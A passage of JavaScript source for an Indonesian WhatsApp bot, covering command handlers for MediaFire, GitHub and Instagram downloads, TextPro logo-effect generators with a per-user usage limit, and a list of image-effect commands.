let tuks = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
} else {
let tuks = "You have been banned\nfor abusing the mediafire feature"
}
addBanned(pushname,calender, senderNumber, ban) 
await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 50mb")              
await setReply(tuks)
return
}
await Fan.sendMedia (from, nana.url, setQuoted, {fileName: nana.filename})
} else{
setReply("Link Invalid")
}
}
break  
case 'githubdl':{
if(!q.includes("|")) return setReply(`Contoh ${prefix}${command}githubdl username|repository`)    
let url = `https://github.com/${q.split("|")[0]}/${q.split("|")[1]}/archive/refs/heads/master.zip`
//ByRizkyAdi
console.log("Done")
setReply(`Waiting for compress to zip`)
await Fan.sendMedia (from, url, setQuoted, {fileName: q.split("|")[1]})
}
break  
case 'gitclone':
try{
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
setReply(`*Mohon tunggu, sedang mengirim repository..*`)
await Fan.sendMedia (from, url, setQuoted, {fileName: filename})
} catch (err){
setReply(mess.error.link)
}
break  
case 'igstory': {
if(!q) return setReply('Usernamenya?')      
Download.insta_story(q).then(async (data) => {
console.log(data.stories)
for(let i of data.stories){
if(i.type == 'photo'){
await Fan.sendMedia (from, i.url, setQuoted, {caption: "Nih"})
} else if(i.type == 'video'){
await Fan.sendMedia (from, i.url, setQuoted, {caption: "Nih"})
}
}
})
}
break  
//━━━━━━━━━━━━━━━[ TEXT PRO ]━━━━━━━━━━━━━━━━━// 
case 'blackping':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'glitch':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break	
case 'glitch2':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
`${teks1}`,`${teks2}`])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break	
case 'glitch3':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
`${teks1}`,`${teks2}`])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'lion':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
`${teks1}`,`${teks2}`])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case '3dspace':
{
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
`${teks1}`,`${teks2}`])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case '3dneon':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'neon':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/neon-text-effect-online-879.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'greenneon':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/green-neon-text-effect-874.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break   
case 'bokeh':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/bokeh-text-effect-876.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break  
case 'hollographic':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break	
case 'bear':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
`${teks1}`,`${teks2}`])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case 'wolf':
{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
`${teks1}`,`${teks2}`])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break		
case 'joker':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-logo-joker-online-934.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break	
case 'dropwater':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'neonlight':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'thewall':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/break-wall-text-effect-871.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'natural':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'carbon':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/carbon-text-effect-833.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'pencil':
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
break
case 'luxury':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-a-3d-luxury-metallic-text-effect-for-free-1071.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'whitegold':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/elegant-white-gold-3d-text-effect-online-free-1070.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'lightglow':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait() 
textpro("https://textpro.me/create-light-glow-sliced-text-effect-online-1068.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'arcane':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-text-effects-arcane-tv-series-online-1067.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'neonlight':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'valentine':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-neon-light-on-brick-wall-online-1062.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'glowingneon':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case 'colorled':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
textpro("https://textpro.me/color-led-display-screen-text-effect-1059.html", [`${q}`,])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
case '3dretro':{
if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
onlyWait()
let teks1 = q.split("|")[0]
let teks2 = q.split("|")[1]
textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [
`${teks1}`,`${teks2}`])
.then((data) => Fan.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
//━━━━━━━━━━━━━━━[ MAKER ]━━━━━━━━━━━━━━━━━//
case 'wanted': 
case 'utatoo': 
case 'unsharpen': 
case 'thanos': 
case 'sniper': 
case 'sharpen': 
case 'sepia': 
case 'scary': 
case 'rip': 
case 'redple': 
case 'rejected': 
case 'posterize': 
case 'ps4': 
case 'pixelize': 
case 'missionpassed': 
case 'moustache': 
case 'lookwhatkarenhave': 
case 'jail': 
case 'invert': 
case 'greyscale': 
case 'glitch': 
case 'gay': 
case 'frame': 
case 'fire': 
case 'distort': 
case 'dictator': 
case 'deepfry': 
case 'ddungeon': 
case 'circle': 
case 'challenger': 
case 'burn': 
case 'brazzers': 
case 'beautiful': 
case 'approved': 
case '3000years':
if (isQuotedImage) {
if (!isDevoloper && !isUserLimit){addInventoriLimit(sender)}
if (!isDevoloper && getLimit(sender) < 1) return setReply(`Limit kamu sudah habis ಥ‿ಥ, Silahkan beli dengan cara berikut :\nketik : #buylimit _jumlah_\nCONTOH❗: #buylimit 1\nKamu juga bisa minta ke owner:\n[ wa.me/${nomerOwner} ]`)
if (!isDevoloper && !isLimit)
{let ko = await Fan.sendMessage(from, { text: `Satu limit terpakaiಥ‿ಥ\nSisa Limit kamu : ${getLimit(sender)}` }, {quoted : setQuoted})    
setTimeout(() => Fan.sendMessage(from, { delete: ko.key}), 4000)}
try{
onlyWait()
let ahah = await Fan.downloadAndSaveMediaMessage(quoted)
let owgi = await TelegraPh(ahah)
let ini_gen = `${command}`
ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
